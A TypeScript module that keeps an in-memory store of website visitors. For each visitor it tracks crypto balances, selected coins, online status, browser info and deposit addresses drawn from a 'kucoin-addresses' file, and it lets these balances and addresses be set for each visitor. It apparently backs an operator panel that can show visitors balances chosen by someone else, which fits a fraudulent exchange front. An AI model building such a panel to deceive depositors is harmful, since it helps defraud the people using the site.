// lib/visitor-store.ts

import { coinAddresses } from "../kucoin-addresses"

interface CryptoBalance {
  quantity: string
  eurBalance: string
  percentageChange: string
}

interface VisitorData {
  id: string
  name: string
  balances: Map<string, CryptoBalance> // Map of cryptoId to balance
  resetRequested: boolean // New flag for session reset
  selectedCryptos: string[] // Store selected cryptocurrencies
  cryptoAddresses: Map<string, string> // New: Map of cryptoId to its assigned address
  isOnline: boolean // New: Online status
  browserInfo: string | null // New: Browser information
}

class VisitorStore {
  private visitors: Map<string, VisitorData> // Map of visitorId to VisitorData
  private visitorCounter: number

  constructor() {
    this.visitors = new Map()
    this.visitorCounter = 0
  }

  getVisitor(visitorId: string): VisitorData | undefined {
    return this.visitors.get(visitorId)
  }

  addVisitor(visitorId: string): VisitorData {
    this.visitorCounter++
    const visitorName = `Visitor ${this.visitorCounter}`
    const newVisitor: VisitorData = {
      id: visitorId,
      name: visitorName,
      balances: new Map(),
      resetRequested: false,
      selectedCryptos: [],
      cryptoAddresses: new Map(),
      isOnline: false, // Initialize as false
      browserInfo: null, // Initialize as null
    }

    // Populate cryptoAddresses with default values from coinAddresses.ts
    for (const [cryptoId, address] of Object.entries(coinAddresses)) {
      newVisitor.cryptoAddresses.set(cryptoId, address)
    }

    this.visitors.set(visitorId, newVisitor)
    return newVisitor
  }

  updateBalance(
    visitorId: string,
    cryptoId: string,
    quantity: string,
    eurBalance: string,
    percentageChange: string,
  ): VisitorData | undefined {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.balances.set(cryptoId, { quantity, eurBalance, percentageChange })
      return visitor
    }
    return undefined
  }

  updateSelectedCryptos(visitorId: string, cryptos: string[]): VisitorData | undefined {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.selectedCryptos = cryptos
      return visitor
    }
    return undefined
  }

  updateCryptoAddress(visitorId: string, cryptoId: string, address: string): VisitorData | undefined {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.cryptoAddresses.set(cryptoId, address)
      return visitor
    }
    return undefined
  }

  markVisitorForReset(visitorId: string): boolean {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.resetRequested = true
      return true
    }
    return false
  }

  deleteVisitor(visitorId: string): boolean {
    console.log(`Attempting to delete visitor: ${visitorId}`)
    const deleted = this.visitors.delete(visitorId)
    if (deleted) {
      console.log(`Visitor ${visitorId} successfully deleted.`)
    } else {
      console.warn(`Visitor ${visitorId} not found for deletion.`)
    }
    return deleted
  }

  getAllVisitors(): VisitorData[] {
    return Array.from(this.visitors.values())
  }

  updateOnlineStatusAndBrowserInfo(
    visitorId: string,
    isOnline: boolean,
    browserInfo: string | null,
  ): VisitorData | undefined {
    const visitor = this.visitors.get(visitorId)
    if (visitor) {
      visitor.isOnline = isOnline
      visitor.browserInfo = browserInfo
      return visitor
    }
    return undefined
  }
}

// Export a singleton instance
export const visitorStore = new VisitorStore()
